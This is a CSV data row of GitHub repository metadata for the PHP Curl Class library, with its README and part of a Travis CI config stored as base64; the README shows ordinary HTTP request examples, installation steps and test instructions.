",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'php-curl-class',12165811,b'PHP Curl Class makes it easy to send HTTP requests and integrate with web APIs',b'PHP',11,2379,,2379,False,b'https://api.github.com/repos/php-curl-class/php-curl-class/forks',"IyBQSFAgQ3VybCBDbGFzczogSFRUUCByZXF1ZXN0cyBtYWRlIGVhc3kKClsh
W10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9naXRodWIvcmVsZWFzZS9waHAt
Y3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy5zdmcpXShodHRwczovL2dpdGh1
Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MvcmVsZWFzZXMv
KQpbIVtdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vZ2l0aHViL2xpY2Vuc2Uv
cGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3Muc3ZnKV0oaHR0cHM6Ly9n
aXRodWIuY29tL3BocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNsYXNzL2Jsb2Iv
bWFzdGVyL0xJQ0VOU0UpClshW10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby90
cmF2aXMvcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3Muc3ZnKV0oaHR0
cHM6Ly90cmF2aXMtY2kub3JnL3BocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNs
YXNzLykKWyFbXShodHRwczovL2ltZy5zaGllbGRzLmlvL3BhY2thZ2lzdC9k
dC9waHAtY3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy5zdmcpXShodHRwczov
L2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MvcmVs
ZWFzZXMvKQoKUEhQIEN1cmwgQ2xhc3MgbWFrZXMgaXQgZWFzeSB0byBzZW5k
IEhUVFAgcmVxdWVzdHMgYW5kIGludGVncmF0ZSB3aXRoIHdlYiBBUElzLgoK
IVtQSFAgQ3VybCBDbGFzcyBzY3JlZW5jYXN0XSh3d3cvaW1nL3NjcmVlbmNh
c3QuZ2lmKQoKLS0tCgotIFtJbnN0YWxsYXRpb25dKCNpbnN0YWxsYXRpb24p
Ci0gW1JlcXVpcmVtZW50c10oI3JlcXVpcmVtZW50cykKLSBbUXVpY2sgU3Rh
cnQgYW5kIEV4YW1wbGVzXSgjcXVpY2stc3RhcnQtYW5kLWV4YW1wbGVzKQot
IFtBdmFpbGFibGUgTWV0aG9kc10oI2F2YWlsYWJsZS1tZXRob2RzKQotIFtT
ZWN1cml0eV0oI3NlY3VyaXR5KQotIFtUcm91Ymxlc2hvb3RpbmddKCN0cm91
Ymxlc2hvb3RpbmcpCi0gW1J1biBUZXN0c10oI3J1bi10ZXN0cykKLSBbQ29u
dHJpYnV0ZV0oI2NvbnRyaWJ1dGUpCgotLS0KCiMjIyBJbnN0YWxsYXRpb24K
ClRvIGluc3RhbGwgUEhQIEN1cmwgQ2xhc3MsIHNpbXBseToKCiAgICAkIGNv
bXBvc2VyIHJlcXVpcmUgcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MK
CkZvciBsYXRlc3QgY29tbWl0IHZlcnNpb246CgogICAgJCBjb21wb3NlciBy
ZXF1aXJlIHBocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNsYXNzIEBkZXYKCiMj
IyBSZXF1aXJlbWVudHMKClBIUCBDdXJsIENsYXNzIHdvcmtzIHdpdGggUEhQ
IDUuMywgNS40LCA1LjUsIDUuNiwgNy4wLCA3LjEsIDcuMiwgNy4zLCBhbmQg
SEhWTS4KCiMjIyBRdWljayBTdGFydCBhbmQgRXhhbXBsZXMKCk1vcmUgZXhh
bXBsZXMgYXJlIGF2YWlsYWJsZSB1bmRlciBbL2V4YW1wbGVzXShodHRwczov
L2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MvdHJl
ZS9tYXN0ZXIvZXhhbXBsZXMpLgoKYGBgcGhwCnJlcXVpcmUgX19ESVJfXyAu
ICcvdmVuZG9yL2F1dG9sb2FkLnBocCc7Cgp1c2UgXEN1cmxcQ3VybDsKCiRj
dXJsID0gbmV3IEN1cmwoKTsKJGN1cmwtPmdldCgnaHR0cHM6Ly93d3cuZXhh
bXBsZS5jb20vJyk7CgppZiAoJGN1cmwtPmVycm9yKSB7CiAgICBlY2hvICdF
cnJvcjogJyAuICRjdXJsLT5lcnJvckNvZGUgLiAnOiAnIC4gJGN1cmwtPmVy
cm9yTWVzc2FnZSAuICJcbiI7Cn0gZWxzZSB7CiAgICBlY2hvICdSZXNwb25z
ZTonIC4gIlxuIjsKICAgIHZhcl9kdW1wKCRjdXJsLT5yZXNwb25zZSk7Cn0K
YGBgCgpgYGBwaHAKLy8gaHR0cHM6Ly93d3cuZXhhbXBsZS5jb20vc2VhcmNo
P3E9a2V5d29yZAokY3VybCA9IG5ldyBDdXJsKCk7CiRjdXJsLT5nZXQoJ2h0
dHBzOi8vd3d3LmV4YW1wbGUuY29tL3NlYXJjaCcsIGFycmF5KAogICAgJ3En
ID0+ICdrZXl3b3JkJywKKSk7CmBgYAoKYGBgcGhwCiRjdXJsID0gbmV3IEN1
cmwoKTsKJGN1cmwtPnBvc3QoJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tL2xv
Z2luLycsIGFycmF5KAogICAgJ3VzZXJuYW1lJyA9PiAnbXl1c2VybmFtZScs
CiAgICAncGFzc3dvcmQnID0+ICdteXBhc3N3b3JkJywKKSk7CmBgYAoKYGBg
cGhwCiRjdXJsID0gbmV3IEN1cmwoKTsKJGN1cmwtPnNldEJhc2ljQXV0aGVu
dGljYXRpb24oJ3VzZXJuYW1lJywgJ3Bhc3N3b3JkJyk7CiRjdXJsLT5zZXRV
c2VyQWdlbnQoJ015VXNlckFnZW50LzAuMC4xICgraHR0cHM6Ly93d3cuZXhh
bXBsZS5jb20vYm90Lmh0bWwpJyk7CiRjdXJsLT5zZXRSZWZlcnJlcignaHR0
cHM6Ly93d3cuZXhhbXBsZS5jb20vdXJsP3VybD1odHRwcyUzQSUyRiUyRnd3
dy5leGFtcGxlLmNvbSUyRicpOwokY3VybC0+c2V0SGVhZGVyKCdYLVJlcXVl
c3RlZC1XaXRoJywgJ1hNTEh0dHBSZXF1ZXN0Jyk7CiRjdXJsLT5zZXRDb29r
aWUoJ2tleScsICd2YWx1ZScpOwokY3VybC0+Z2V0KCdodHRwczovL3d3dy5l
eGFtcGxlLmNvbS8nKTsKCmlmICgkY3VybC0+ZXJyb3IpIHsKICAgIGVjaG8g
J0Vycm9yOiAnIC4gJGN1cmwtPmVycm9yQ29kZSAuICc6ICcgLiAkY3VybC0+
ZXJyb3JNZXNzYWdlIC4gIlxuIjsKfSBlbHNlIHsKICAgIGVjaG8gJ1Jlc3Bv
bnNlOicgLiAiXG4iOwogICAgdmFyX2R1bXAoJGN1cmwtPnJlc3BvbnNlKTsK
fQoKdmFyX2R1bXAoJGN1cmwtPnJlcXVlc3RIZWFkZXJzKTsKdmFyX2R1bXAo
JGN1cmwtPnJlc3BvbnNlSGVhZGVycyk7CmBgYAoKYGBgcGhwCiRjdXJsID0g
bmV3IEN1cmwoKTsKJGN1cmwtPnNldE9wdChDVVJMT1BUX0ZPTExPV0xPQ0FU
SU9OLCB0cnVlKTsKJGN1cmwtPmdldCgnaHR0cHM6Ly9zaG9ydG4uZXhhbXBs
ZS5jb20vYkhiVnNQJyk7CmBgYAoKYGBgcGhwCiRjdXJsID0gbmV3IEN1cmwo
KTsKJGN1cmwtPnB1dCgnaHR0cHM6Ly9hcGkuZXhhbXBsZS5jb20vdXNlci8n
LCBhcnJheSgKICAgICdmaXJzdF9uYW1lJyA9PiAnWmFjaCcsCiAgICAnbGFz
dF9uYW1lJyA9PiAnQm9yYm9hJywKKSk7CmBgYAoKYGBgcGhwCiRjdXJsID0g
bmV3IEN1cmwoKTsKJGN1cmwtPnBhdGNoKCdodHRwczovL2FwaS5leGFtcGxl
LmNvbS9wcm9maWxlLycsIGFycmF5KAogICAgJ2ltYWdlJyA9PiAnQHBhdGgv
dG8vZmlsZS5qcGcnLAopKTsKYGBgCgpgYGBwaHAKJGN1cmwgPSBuZXcgQ3Vy
bCgpOwokY3VybC0+cGF0Y2goJ2h0dHBzOi8vYXBpLmV4YW1wbGUuY29tL3By
b2ZpbGUvJywgYXJyYXkoCiAgICAnaW1hZ2UnID0+IG5ldyBDVVJMRmlsZSgn
cGF0aC90by9maWxlLmpwZycpLAopKTsKYGBgCgpgYGBwaHAKJGN1cmwgPSBu
ZXcgQ3VybCgpOwokY3VybC0+ZGVsZXRlKCdodHRwczovL2FwaS5leGFtcGxl
LmNvbS91c2VyLycsIGFycmF5KAogICAgJ2lkJyA9PiAnMTIzNCcsCikpOwpg
YGAKCmBgYHBocAovLyBFbmFibGUgYWxsIHN1cHBvcnRlZCBlbmNvZGluZyB0
eXBlcyBhbmQgZG93bmxvYWQgYSBmaWxlLgokY3VybCA9IG5ldyBDdXJsKCk7
CiRjdXJsLT5zZXRPcHQoQ1VSTE9QVF9FTkNPRElORyAsICcnKTsKJGN1cmwt
PmRvd25sb2FkKCdodHRwczovL3d3dy5leGFtcGxlLmNvbS9maWxlLmJpbics
ICcvdG1wL215ZmlsZS5iaW4nKTsKYGBgCgpgYGBwaHAKLy8gQ2FzZS1pbnNl
bnNpdGl2ZSBhY2Nlc3MgdG8gaGVhZGVycy4KJGN1cmwgPSBuZXcgQ3VybCgp
OwokY3VybC0+ZG93bmxvYWQoJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tL2lt
YWdlLnBuZycsICcvdG1wL215aW1hZ2UucG5nJyk7CmVjaG8gJGN1cmwtPnJl
c3BvbnNlSGVhZGVyc1snQ29udGVudC1UeXBlJ10gLiAiXG4iOyAvLyBpbWFn
ZS9wbmcKZWNobyAkY3VybC0+cmVzcG9uc2VIZWFkZXJzWydDb05UZU5ULVR5
UEUnXSAuICJcbiI7IC8vIGltYWdlL3BuZwpgYGAKCmBgYHBocAovLyBNYW51
YWwgY2xlYW4gdXAuCiRjdXJsLT5jbG9zZSgpOwpgYGAKCmBgYHBocAovLyBF
eGFtcGxlIGFjY2VzcyB0byBjdXJsIG9iamVjdC4KY3VybF9zZXRfb3B0KCRj
dXJsLT5jdXJsLCBDVVJMT1BUX1VTRVJBR0VOVCwgJ01vemlsbGEvNC4wIChj
b21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjEnKTsKY3VybF9j
bG9zZSgkY3VybC0+Y3VybCk7CmBgYAoKYGBgcGhwCnJlcXVpcmUgX19ESVJf
XyAuICcvdmVuZG9yL2F1dG9sb2FkLnBocCc7Cgp1c2UgXEN1cmxcTXVsdGlD
dXJsOwoKLy8gUmVxdWVzdHMgaW4gcGFyYWxsZWwgd2l0aCBjYWxsYmFjayBm
dW5jdGlvbnMuCiRtdWx0aV9jdXJsID0gbmV3IE11bHRpQ3VybCgpOwoKJG11
bHRpX2N1cmwtPnN1Y2Nlc3MoZnVuY3Rpb24oJGluc3RhbmNlKSB7CiAgICBl
Y2hvICdjYWxsIHRvICInIC4gJGluc3RhbmNlLT51cmwgLiAnIiB3YXMgc3Vj
Y2Vzc2Z1bC4nIC4gIlxuIjsKICAgIGVjaG8gJ3Jlc3BvbnNlOicgLiAiXG4i
OwogICAgdmFyX2R1bXAoJGluc3RhbmNlLT5yZXNwb25zZSk7Cn0pOwokbXVs
dGlfY3VybC0+ZXJyb3IoZnVuY3Rpb24oJGluc3RhbmNlKSB7CiAgICBlY2hv
ICdjYWxsIHRvICInIC4gJGluc3RhbmNlLT51cmwgLiAnIiB3YXMgdW5zdWNj
ZXNzZnVsLicgLiAiXG4iOwogICAgZWNobyAnZXJyb3IgY29kZTogJyAuICRp
bnN0YW5jZS0+ZXJyb3JDb2RlIC4gIlxuIjsKICAgIGVjaG8gJ2Vycm9yIG1l
c3NhZ2U6ICcgLiAkaW5zdGFuY2UtPmVycm9yTWVzc2FnZSAuICJcbiI7Cn0p
OwokbXVsdGlfY3VybC0+Y29tcGxldGUoZnVuY3Rpb24oJGluc3RhbmNlKSB7
CiAgICBlY2hvICdjYWxsIGNvbXBsZXRlZCcgLiAiXG4iOwp9KTsKCiRtdWx0
aV9jdXJsLT5hZGRHZXQoJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNo
JywgYXJyYXkoCiAgICAncScgPT4gJ2hlbGxvIHdvcmxkJywKKSk7CiRtdWx0
aV9jdXJsLT5hZGRHZXQoJ2h0dHBzOi8vZHVja2R1Y2tnby5jb20vJywgYXJy
YXkoCiAgICAncScgPT4gJ2hlbGxvIHdvcmxkJywKKSk7CiRtdWx0aV9jdXJs
LT5hZGRHZXQoJ2h0dHBzOi8vd3d3LmJpbmcuY29tL3NlYXJjaCcsIGFycmF5
KAogICAgJ3EnID0+ICdoZWxsbyB3b3JsZCcsCikpOwoKJG11bHRpX2N1cmwt
PnN0YXJ0KCk7IC8vIEJsb2NrcyB1bnRpbCBhbGwgaXRlbXMgaW4gdGhlIHF1
ZXVlIGhhdmUgYmVlbiBwcm9jZXNzZWQuCmBgYAoKTW9yZSBleGFtcGxlcyBh
cmUgYXZhaWxhYmxlIHVuZGVyIFsvZXhhbXBsZXNdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9waHAtY3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy90cmVlL21hc3Rl
ci9leGFtcGxlcykuCgojIyMgQXZhaWxhYmxlIE1ldGhvZHMKYGBgcGhwCkN1
cmw6Ol9fY29uc3RydWN0KCRiYXNlX3VybCA9IG51bGwpCkN1cmw6Ol9fZGVz
dHJ1Y3QoKQpDdXJsOjpfX2dldCgkbmFtZSkKQ3VybDo6YXR0ZW1wdFJldHJ5
KCkKQ3VybDo6YmVmb3JlU2VuZCgkY2FsbGJhY2spCkN1cmw6OmJ1aWxkUG9z
dERhdGEoJGRhdGEpCkN1cmw6OmNhbGwoKQpDdXJsOjpjbG9zZSgpCkN1cmw6
OmNvbXBsZXRlKCRjYWxsYmFjaykKQ3VybDo6ZGVsZXRlKCR1cmwsICRxdWVy
eV9wYXJhbWV0ZXJzID0gYXJyYXkoKSwgJGRhdGEgPSBhcnJheSgpKQpDdXJs
Ojpkb3dubG9hZCgkdXJsLCAkbWl4ZWRfZmlsZW5hbWUpCkN1cmw6OmVycm9y
KCRjYWxsYmFjaykKQ3VybDo6ZXhlYygkY2ggPSBudWxsKQpDdXJsOjpleGVj
RG9uZSgpCkN1cmw6OmdldCgkdXJsLCAkZGF0YSA9IGFycmF5KCkpCkN1cmw6
OmdldEF0dGVtcHRzKCkKQ3VybDo6Z2V0QmVmb3JlU2VuZENhbGxiYWNrKCkK
Q3VybDo6Z2V0Q29tcGxldGVDYWxsYmFjaygpCkN1cmw6OmdldENvb2tpZSgk
a2V5KQpDdXJsOjpnZXRDdXJsKCkKQ3VybDo6Z2V0Q3VybEVycm9yQ29kZSgp
CkN1cmw6OmdldEN1cmxFcnJvck1lc3NhZ2UoKQpDdXJsOjpnZXREb3dubG9h
ZENvbXBsZXRlQ2FsbGJhY2soKQpDdXJsOjpnZXREb3dubG9hZEZpbGVOYW1l
KCkKQ3VybDo6Z2V0RXJyb3JDYWxsYmFjaygpCkN1cmw6OmdldEVycm9yQ29k
ZSgpCkN1cmw6OmdldEVycm9yTWVzc2FnZSgpCkN1cmw6OmdldEZpbGVIYW5k
bGUoKQpDdXJsOjpnZXRIdHRwRXJyb3JNZXNzYWdlKCkKQ3VybDo6Z2V0SHR0
cFN0YXR1c0NvZGUoKQpDdXJsOjpnZXRJZCgpCkN1cmw6OmdldEluZm8oJG9w
dCA9IG51bGwpCkN1cmw6OmdldEpzb25EZWNvZGVyKCkKQ3VybDo6Z2V0T3B0
KCRvcHRpb24pCkN1cmw6OmdldFJhd1Jlc3BvbnNlKCkKQ3VybDo6Z2V0UmF3
UmVzcG9uc2VIZWFkZXJzKCkKQ3VybDo6Z2V0UmVtYWluaW5nUmV0cmllcygp
CkN1cmw6OmdldFJlcXVlc3RIZWFkZXJzKCkKQ3VybDo6Z2V0UmVzcG9uc2Uo
KQpDdXJsOjpnZXRSZXNwb25zZUNvb2tpZSgka2V5KQpDdXJsOjpnZXRSZXNw
b25zZUNvb2tpZXMoKQpDdXJsOjpnZXRSZXNwb25zZUhlYWRlcnMoKQpDdXJs
OjpnZXRSZXRyaWVzKCkKQ3VybDo6Z2V0UmV0cnlEZWNpZGVyKCkKQ3VybDo6
Z2V0U3VjY2Vzc0NhbGxiYWNrKCkKQ3VybDo6Z2V0VXJsKCkKQ3VybDo6Z2V0
WG1sRGVjb2RlcigpCkN1cmw6OmhlYWQoJHVybCwgJGRhdGEgPSBhcnJheSgp
KQpDdXJsOjppc0NoaWxkT2ZNdWx0aUN1cmwoKQpDdXJsOjppc0N1cmxFcnJv
cigpCkN1cmw6OmlzRXJyb3IoKQpDdXJsOjppc0h0dHBFcnJvcigpCkN1cmw6
Om9wdGlvbnMoJHVybCwgJGRhdGEgPSBhcnJheSgpKQpDdXJsOjpwYXRjaCgk
dXJsLCAkZGF0YSA9IGFycmF5KCkpCkN1cmw6OnBvc3QoJHVybCwgJGRhdGEg
PSAnJywgJGZvbGxvd18zMDNfd2l0aF9wb3N0ID0gZmFsc2UpCkN1cmw6OnBy
b2dyZXNzKCRjYWxsYmFjaykKQ3VybDo6cHV0KCR1cmwsICRkYXRhID0gYXJy
YXkoKSkKQ3VybDo6cmVtb3ZlSGVhZGVyKCRrZXkpCkN1cmw6OnJlc2V0KCkK
Q3VybDo6c2VhcmNoKCR1cmwsICRkYXRhID0gYXJyYXkoKSkKQ3VybDo6c2V0
QmFzaWNBdXRoZW50aWNhdGlvbigkdXNlcm5hbWUsICRwYXNzd29yZCA9ICcn
KQpDdXJsOjpzZXRDb25uZWN0VGltZW91dCgkc2Vjb25kcykKQ3VybDo6c2V0
Q29va2llKCRrZXksICR2YWx1ZSkKQ3VybDo6c2V0Q29va2llRmlsZSgkY29v
a2llX2ZpbGUpCkN1cmw6OnNldENvb2tpZUphcigkY29va2llX2phcikKQ3Vy
bDo6c2V0Q29va2llU3RyaW5nKCRzdHJpbmcpCkN1cmw6OnNldENvb2tpZXMo
JGNvb2tpZXMpCkN1cmw6OnNldERlZmF1bHREZWNvZGVyKCRtaXhlZCA9ICdq
c29uJykKQ3VybDo6c2V0RGVmYXVsdEpzb25EZWNvZGVyKCkKQ3VybDo6c2V0
RGVmYXVsdFRpbWVvdXQoKQpDdXJsOjpzZXREZWZhdWx0VXNlckFnZW50KCkK
Q3VybDo6c2V0RGVmYXVsdFhtbERlY29kZXIoKQpDdXJsOjpzZXREaWdlc3RB
dXRoZW50aWNhdGlvbigkdXNlcm5hbWUsICRwYXNzd29yZCA9ICcnKQpDdXJs
OjpzZXRIZWFkZXIoJGtleSwgJHZhbHVlKQpDdXJsOjpzZXRIZWFkZXJzKCRo
ZWFkZXJzKQpDdXJsOjpzZXRKc29uRGVjb2RlcigkbWl4ZWQpCkN1cmw6OnNl
dE1heEZpbGVzaXplKCRieXRlcykKQ3VybDo6c2V0T3B0KCRvcHRpb24sICR2
YWx1ZSkKQ3VybDo6c2V0T3B0cygkb3B0aW9ucykKQ3VybDo6c2V0UG9ydCgk
cG9ydCkKQ3VybDo6c2V0UHJveHkoJHByb3h5LCAkcG9ydCA9IG51bGwsICR1
c2VybmFtZSA9IG51bGwsICRwYXNzd29yZCA9IG51bGwpCkN1cmw6OnNldFBy
b3h5QXV0aCgkYXV0aCkKQ3VybDo6c2V0UHJveHlUdW5uZWwoJHR1bm5lbCA9
IHRydWUpCkN1cmw6OnNldFByb3h5VHlwZSgkdHlwZSkKQ3VybDo6c2V0UmVm
ZXJlcigkcmVmZXJlcikKQ3VybDo6c2V0UmVmZXJyZXIoJHJlZmVycmVyKQpD
dXJsOjpzZXRSZXRyeSgkbWl4ZWQpCkN1cmw6OnNldFRpbWVvdXQoJHNlY29u
ZHMpCkN1cmw6OnNldFVybCgkdXJsLCAkbWl4ZWRfZGF0YSA9ICcnKQpDdXJs
OjpzZXRVc2VyQWdlbnQoJHVzZXJfYWdlbnQpCkN1cmw6OnNldFhtbERlY29k
ZXIoJG1peGVkKQpDdXJsOjpzdWNjZXNzKCRjYWxsYmFjaykKQ3VybDo6dW5z
ZXRIZWFkZXIoJGtleSkKQ3VybDo6dW5zZXRQcm94eSgpCkN1cmw6OnZlcmJv
c2UoJG9uID0gdHJ1ZSwgJG91dHB1dCA9IFNUREVSUikKTXVsdGlDdXJsOjpf
X2NvbnN0cnVjdCgkYmFzZV91cmwgPSBudWxsKQpNdWx0aUN1cmw6Ol9fZGVz
dHJ1Y3QoKQpNdWx0aUN1cmw6OmFkZEN1cmwoQ3VybCAkY3VybCkKTXVsdGlD
dXJsOjphZGREZWxldGUoJHVybCwgJHF1ZXJ5X3BhcmFtZXRlcnMgPSBhcnJh
eSgpLCAkZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkRG93bmxvYWQo
JHVybCwgJG1peGVkX2ZpbGVuYW1lKQpNdWx0aUN1cmw6OmFkZEdldCgkdXJs
LCAkZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkSGVhZCgkdXJsLCAk
ZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkT3B0aW9ucygkdXJsLCAk
ZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkUGF0Y2goJHVybCwgJGRh
dGEgPSBhcnJheSgpKQpNdWx0aUN1cmw6OmFkZFBvc3QoJHVybCwgJGRhdGEg
PSAnJywgJGZvbGxvd18zMDNfd2l0aF9wb3N0ID0gZmFsc2UpCk11bHRpQ3Vy
bDo6YWRkUHV0KCR1cmwsICRkYXRhID0gYXJyYXkoKSkKTXVsdGlDdXJsOjph
ZGRTZWFyY2goJHVybCwgJGRhdGEgPSBhcnJheSgpKQpNdWx0aUN1cmw6OmJl
Zm9yZVNlbmQoJGNhbGxiYWNrKQpNdWx0aUN1cmw6OmNsb3NlKCkKTXVsdGlD
dXJsOjpjb21wbGV0ZSgkY2FsbGJhY2spCk11bHRpQ3VybDo6ZXJyb3IoJGNh
bGxiYWNrKQpNdWx0aUN1cmw6OmdldE9wdCgkb3B0aW9uKQpNdWx0aUN1cmw6
OnJlbW92ZUhlYWRlcigka2V5KQpNdWx0aUN1cmw6OnNldEJhc2ljQXV0aGVu
dGljYXRpb24oJHVzZXJuYW1lLCAkcGFzc3dvcmQgPSAnJykKTXVsdGlDdXJs
OjpzZXRDb25jdXJyZW5jeSgkY29uY3VycmVuY3kpCk11bHRpQ3VybDo6c2V0
Q29ubmVjdFRpbWVvdXQoJHNlY29uZHMpCk11bHRpQ3VybDo6c2V0Q29va2ll
KCRrZXksICR2YWx1ZSkKTXVsdGlDdXJsOjpzZXRDb29raWVGaWxlKCRjb29r
aWVfZmlsZSkKTXVsdGlDdXJsOjpzZXRDb29raWVKYXIoJGNvb2tpZV9qYXIp
Ck11bHRpQ3VybDo6c2V0Q29va2llU3RyaW5nKCRzdHJpbmcpCk11bHRpQ3Vy
bDo6c2V0Q29va2llcygkY29va2llcykKTXVsdGlDdXJsOjpzZXREaWdlc3RB
dXRoZW50aWNhdGlvbigkdXNlcm5hbWUsICRwYXNzd29yZCA9ICcnKQpNdWx0
aUN1cmw6OnNldEhlYWRlcigka2V5LCAkdmFsdWUpCk11bHRpQ3VybDo6c2V0
SGVhZGVycygkaGVhZGVycykKTXVsdGlDdXJsOjpzZXRKc29uRGVjb2Rlcigk
bWl4ZWQpCk11bHRpQ3VybDo6c2V0T3B0KCRvcHRpb24sICR2YWx1ZSkKTXVs
dGlDdXJsOjpzZXRPcHRzKCRvcHRpb25zKQpNdWx0aUN1cmw6OnNldFBvcnQo
JHBvcnQpCk11bHRpQ3VybDo6c2V0UHJveGllcygkcHJveGllcykKTXVsdGlD
dXJsOjpzZXRQcm94eSgkcHJveHksICRwb3J0ID0gbnVsbCwgJHVzZXJuYW1l
ID0gbnVsbCwgJHBhc3N3b3JkID0gbnVsbCkKTXVsdGlDdXJsOjpzZXRQcm94
eUF1dGgoJGF1dGgpCk11bHRpQ3VybDo6c2V0UHJveHlUdW5uZWwoJHR1bm5l
bCA9IHRydWUpCk11bHRpQ3VybDo6c2V0UHJveHlUeXBlKCR0eXBlKQpNdWx0
aUN1cmw6OnNldFJlZmVyZXIoJHJlZmVyZXIpCk11bHRpQ3VybDo6c2V0UmVm
ZXJyZXIoJHJlZmVycmVyKQpNdWx0aUN1cmw6OnNldFJldHJ5KCRtaXhlZCkK
TXVsdGlDdXJsOjpzZXRUaW1lb3V0KCRzZWNvbmRzKQpNdWx0aUN1cmw6OnNl
dFVybCgkdXJsKQpNdWx0aUN1cmw6OnNldFVzZXJBZ2VudCgkdXNlcl9hZ2Vu
dCkKTXVsdGlDdXJsOjpzZXRYbWxEZWNvZGVyKCRtaXhlZCkKTXVsdGlDdXJs
OjpzdGFydCgpCk11bHRpQ3VybDo6c3VjY2VzcygkY2FsbGJhY2spCk11bHRp
Q3VybDo6dW5zZXRIZWFkZXIoJGtleSkKTXVsdGlDdXJsOjp1bnNldFByb3h5
KCkKTXVsdGlDdXJsOjp2ZXJib3NlKCRvbiA9IHRydWUsICRvdXRwdXQgPSBT
VERFUlIpCmBgYAoKIyMjIFNlY3VyaXR5CgpTZWUgW1NFQ1VSSVRZXShodHRw
czovL2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3Mv
YmxvYi9tYXN0ZXIvU0VDVVJJVFkubWQpIGZvciBzZWN1cml0eSBjb25zaWRl
cmF0aW9ucy4KCiMjIyBUcm91Ymxlc2hvb3RpbmcKClNlZSBbVFJPVUJMRVNI
T09USU5HXShodHRwczovL2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhw
LWN1cmwtY2xhc3MvYmxvYi9tYXN0ZXIvVFJPVUJMRVNIT09USU5HLm1kKSBm
b3IgdHJvdWJsZXNob290aW5nLgoKIyMjIFJ1biBUZXN0cwoKVG8gcnVuIHRl
c3RzOgoKICAgICQgZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9waHAt
Y3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy5naXQKICAgICQgY2QgcGhwLWN1
cmwtY2xhc3MvCiAgICAkIGNvbXBvc2VyIHVwZGF0ZQogICAgJCAuL3Rlc3Rz
L3J1bi5zaAoKVG8gcnVuIHNlbGVjdCB0ZXN0czoKCiAgICAkIGdpdCBjbG9u
ZSBodHRwczovL2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwt
Y2xhc3MuZ2l0CiAgICAkIGNkIHBocC1jdXJsLWNsYXNzLwogICAgJCBjb21w
b3NlciB1cGRhdGUKICAgICQgLi90ZXN0cy9ydW4uc2ggLS1maWx0ZXI9a2V5
d29yZAoKVG8gdGVzdCBhbGwgUEhQIHZlcnNpb25zIGluIGNvbnRhaW5lcnM6
CgogICAgJCBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3BocC1jdXJs
LWNsYXNzL3BocC1jdXJsLWNsYXNzLmdpdAogICAgJCBjZCBwaHAtY3VybC1j
bGFzcy8KICAgICQgLi90ZXN0cy90ZXN0X2FsbC5zaAoKIyMjIENvbnRyaWJ1
dGUKCjEuIENoZWNrIGZvciBvcGVuIGlzc3VlcyBvciBvcGVuIGEgbmV3IGlz
c3VlIHRvIHN0YXJ0IGEgZGlzY3Vzc2lvbiBhcm91bmQgYSBidWcgb3IgZmVh
dHVyZS4KMS4gRm9yayB0aGUgcmVwb3NpdG9yeSBvbiBHaXRIdWIgdG8gc3Rh
cnQgbWFraW5nIHlvdXIgY2hhbmdlcy4KMS4gV3JpdGUgb25lIG9yIG1vcmUg
dGVzdHMgZm9yIHRoZSBuZXcgZmVhdHVyZSBvciB0aGF0IGV4cG9zZSB0aGUg
YnVnLgoxLiBNYWtlIGNvZGUgY2hhbmdlcyB0byBpbXBsZW1lbnQgdGhlIGZl
YXR1cmUgb3IgZml4IHRoZSBidWcuCjEuIFNlbmQgYSBwdWxsIHJlcXVlc3Qg
dG8gZ2V0IHlvdXIgY2hhbmdlcyBtZXJnZWQgYW5kIHB1Ymxpc2hlZC4K
",,"bGFuZ3VhZ2U6IHBocAoKbWF0cml4OgogIGFsbG93X2ZhaWx1cmVzOgogICAg
LSBwaHA6IDUuNAogICAgLSBwaHA6IDUuNQogICAgLSBwaHA6IDUuNgogICAg
LSBwaHA6IGhodm0KICAgIC0gcGhwOiBoaHZtLW5pZ2h0bHkKICAgIC0gcGhw
OiBuaWdodGx5CiAgaW5jbHVkZToKICAgIC0gcGhwOiA1LjMKICAgICAgZGlz
dDogcHJlY2lzZQogICAgLSBwaHA6IDUuNAogICAgICBkaXN0OiB0cnVzdHkK
ICAgIC0gcGhwOiA1LjUKICAgICAgZGlzdDogdHJ1c3R5CiAgICAtIHBocDog
NS42CiAgICAgIGRpc3Q6IHRydXN0eQogICAgLSBwaHA6IDcuMAogICAgICBk
